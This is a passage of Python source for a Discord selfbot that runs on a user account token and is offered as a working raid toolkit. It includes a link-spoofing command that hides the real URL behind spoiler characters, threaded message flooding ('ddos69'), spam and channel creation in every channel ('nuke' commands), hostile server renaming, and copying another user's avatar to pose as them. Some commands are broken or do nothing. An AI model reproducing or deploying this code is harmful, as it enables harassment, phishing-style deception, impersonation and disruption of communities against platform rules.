                print(f'left {gc.name}')
            except:
                print(f'failed {gc.name}')
            print('done leaving gcs')
            
            
            
            


@bot.command(aliases=['fakeurl'])  # Fake url command
async def fake_url(ctx, arg1, arg2):
    await ctx.message.delete()

    fake_url = f'''<{arg1}> ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ {arg2}'''
    await ctx.send(fake_url)
    
    
    
@bot.command()  # Hypesquad badge changer
async def hypesquad(ctx, arg):
    hypesquad = int(arg)

    headers = {
        'authorization': token
    }

    body = {
        'house_id': hypesquad
    }

    meResponse = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)

    response = requests.post('https://discord.com/api/v9/hypesquad/online', headers=headers, json=body)

    if response.status_code == 204:
        await ctx.send('**`Changed badge succesfully!`**')

    elif response.status_code == 401:
        await ctx.send('**`Changing badge has failed: 401`**')

    elif response.status_code == 429:
        await ctx.send('**`Changing badge has failed: Rate limited (429)`**')
        
        
@bot.command()
async def create_gcspam(ctx, content, times):
     for i in range(times):
         member = ctx.member()
         members = random.choice in member
         await discord.GroupChannel.create(members=members, name = f' {content}')
         
         
         
@bot.listen()
async def on_message(message):
    if copy == "True":
        if message.author.id in ids:
            await message.channel.send(message.content)

    
            
@bot.command()
async def pingweb(ctx, url):
    if not url:
        await ctx.send('must have a url')
        return
    
    r = requests.get(url).status.code
    if r == 404:
        await ctx.send('website down')
    else:
        await ctx.send('website is ok')




@bot.command()
async def guildIcon(ctx):
    if not ctx.guild:
        await ctx.send('please enter an guild id')
        return
    guild = ctx.guild.icon.url
    await ctx.send(guild)
    
    
    
    
@bot.command()
async def changeGuildName(ctx, name):
    if not name:
        await ctx.send('please enter a name')
        return
    if not ctx.guild:
        await ctx.send('this has to be in a guild')
        return
    await ctx.guild.edit(name=name)
    


@bot.command()
async def RotateGuildName(ctx):
    for i in range(110):
      await ctx.guild.edit(name=f"justice owns you {i}")
      time.sleep(1)

    
        
   
        
@bot.command()      
async def madeby(ctx):  
    await ctx.send('made by #NPSD and #JX$TICE')
    
    
    
    

@bot.command()
async def clearScreen(ctx):
    os.system('cls')
    await ctx.send('cleared screen')
    
    


@bot.command()
async def google(ctx, message):
    await ctx.send(f'https://www.google.com/search?{message}')
    
    
@bot.command()
async def wallpapera(ctx):
    r = requests.get("http://api.nekos.fun:8080/api/wallpapers").json()
    await ctx.send(str(r['image']))
    
    
    
@bot.command()
async def yes(ctx):
    await ctx.send('yes')
    
    
@bot.command()
async def no(ctx):
    await ctx.send('no')
    
    
    
@bot.command()
async def image(ctx, text):
    await ctx.send(f"https://yandex.com/images/search?text={(text)}")
    
    

     


@bot.command() 
async def pfpsteal(ctx, user: discord.User):  
    await ctx.message.delete()
    if password == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        with open('data/stolen.png', 'wb') as f:
            r = requests.get(user.avatar_url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
        try:
            with open('data/stolen.png', 'rb') as f:
                await bot.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET) 

    
    
@bot.command()
async def userPfp(ctx, user: discord.User):
    send = user.avatar_url
    try:
      await ctx.send(send)
    except:
        await ctx.send('**didnt work error**: || your  gay ||')


@bot.command()  
async def DiscordNameLookup(ctx, User: discord.User):
    user = User
    google = f"https://www.google.com/search?{user.name}"  
    await ctx.send(google)
    
    
    
@bot.command()
async def nameLookup(ctx, name):
    google_name = f"https://www.google.com/search?{name}"
    await ctx.send(google_name)
    
    
    
@bot.command()
async def bypass(ctx, invite):
    await ctx.send(f'bypassed banned invite: {invite}')
    
    
    
@bot.command()
async def sharks(ctx):
    list = """
    sand tiger sharks
    tiger sharks
    black tip sharks
    mako sharks
    """
    await ctx.send(list)
    

@bot.command()
async def deleted_messages(ctx):
    file = open('Deleted_messages.txt', 'r')
    con =  "\n".join(file.readlines())
    try:
        await ctx.send(con)
    except:
        await ctx.send('no deleted messages to send')
    
    

@bot.command()
async def clear_deleted_messages(ctx):
    f = open('Deleted_messages.txt', 'r+')
    try:
      f.truncate(0) # need '0' when using r+
    except:
        await ctx.send('nothing to delete ')
    
  
            
            
  
@bot.listen()
async def on_group_remove(user, channel):
    print(f"{user} left {channel.name} ")

    
  
    
@bot.command()
async def ddosNuke(ctx, msg):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(msg)
        except:
            continue
        
        
        
    
@bot.command()   
async def channelNuke(ctx, channel_names):
    await ctx.send('creating 30 channels')
    for i in range(30):
        time.sleep(2)
        await ctx.message.guild.create_text_channel(channel_names)
     

     
     
    
      
    
        
        
        
    
    
     
        
                        
                   
                    
                        
        
          
                        
                
                
    



        
        
        
        
        





    
    
        
    
 
    
    

    








 
    




        
        



        
        
    
    
    

    
    
    
@bot.command()
async def IronMan(ctx):
    ps = password
    filepath = "lol.jpg"
    with open (filepath, 'rb') as avt:
      avatar = avt.read()
      await bot.user.edit(avatar=avatar, password=ps)
      await ctx.send('**done**')
    
@bot.command()
async def ddos69(ctx):
    await ctx.message.delete()
    
    # Read messages from meme.txt file
    try:
        with open('raid.txt', 'r') as file:
            messages = file.readlines()
    except FileNotFoundError:
        await ctx.send("Error: txt file not found.")
        return
    except Exception as e:
        await ctx.send(f"An error occurred while reading the file: {str(e)}")
        return

    def send(message):
        for i in range(17):
            data = {
                'content': message.strip()
            }
            headers = {
                "authorization": token
            }
            # Use the channel ID of the context where the command was invoked
            url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
            try:
                r = requests.post(url, headers=headers, json=data)
                
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {str(e)}")

    threads = []
    for message in messages:
        t = threading.Thread(target=send, args=(message,))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()
        
        
    
@bot.command()
async def kiss(ctx, User: discord.User):
    global countt
    await ctx.send(f' {ctx.author} kissed {User.mention}  https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExNmxzcWZqazJldHhsNzNzZjY5N2Jxcmx5enJhcHc3ZjNxNTBiZGVydCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/FqBTvSNjNzeZG/giphy.gif')
    for i in range(1):
      countt += 1
      await ctx.send(f'kisses total: {countt} ')
                


def status():
    bot.change_presence(status=discord.Status.dnd, activity=discord.game('lol'))
    

                                                                                                                                                                              
@bot.event                                                                                                                                                          
async def on_ready():
  os.system('color 1')
  print("logged in!")
  status()
  


bot.run(token)